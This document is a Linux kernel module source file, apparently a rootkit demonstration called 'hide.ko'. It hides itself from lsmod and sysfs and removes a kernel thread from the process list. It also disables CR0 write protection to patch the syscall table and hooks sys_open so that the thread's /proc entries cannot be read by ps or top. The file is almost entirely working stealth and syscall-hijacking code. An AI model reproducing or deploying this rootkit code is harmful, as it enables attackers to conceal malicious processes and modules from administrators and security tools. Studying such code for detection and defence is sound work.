#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/list.h>
#include <asm/paravirt.h>

static struct task_struct *task;
void **sys_call_table;
unsigned long original_cr0;
asmlinkage int (*original_call) (const char *, int, int);

static void **acquire_sys_call_table(void) {
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;
	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;
		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return (void **)sct;
		offset += sizeof(void *);
	}
	return NULL;
}

asmlinkage int our_sys_open(const char *filename, int flags, int mode)
{
	char proc_name_stat[20];
	char proc_name_status[20];
	sprintf(proc_name_stat, "/proc/%d/stat", task->pid);
	sprintf(proc_name_status, "/proc/%d/status", task->pid);
	if (strcmp(filename, proc_name_stat) == 0 || strcmp(filename, proc_name_status) == 0) {
		printk(KERN_INFO "Hijack %s successfully.\n", filename);
		return -1;
	}
	return original_call(filename, flags, mode);
}

void modify_sys_open(void)
{
	original_cr0 = read_cr0();
	write_cr0(original_cr0 & ~0x00010000);

	sys_call_table = acquire_sys_call_table();
	original_call = sys_call_table[__NR_open];
	sys_call_table[__NR_open] = our_sys_open;

	write_cr0(original_cr0);

	printk(KERN_INFO "Successfully hijack sys_open.\n");
}

static int invisible(void *data)
{
	int count = 0;
	struct task_struct *p;
	printk(KERN_INFO "And I am invisible %d.\n", task->pid);
	while (1) {
		count += 1;
		printk("---- round %d ----\n", count);
		for_each_process(p) {
			if (p->parent->pid == 2) {
				printk("kthread %d: %s\n", p->pid, p->comm);
			}
		}
		msleep(5000);
	}
	return 0;
}

int init_module(void)
{
	struct task_struct *p;
	printk(KERN_INFO "I am hide.ko %d.\n", current->pid);
	task = kthread_run(&invisible, NULL, "invisible");

	/* hide me from lsmod */
	list_del_init(&__this_module.list);

	/* hide me from sysfs */
	kobject_del(__this_module.holders_dir->parent);

	/* hide me from task list */
	list_del(&task->tasks);
	/* check */
	for_each_process(p) {
		printk(KERN_INFO "PID %d in task list.\n", p->pid);
		if (p->pid == task->pid) {
			printk(KERN_INFO "Failed to hide from task list.\n");
		}
	}

	/* hide me from ps & top */
	modify_sys_open();

        return 0;
}

void cleanup_module(void)
{
	printk(KERN_INFO "Visibly goodbye.\n");
}

MODULE_LICENSE("GPL");
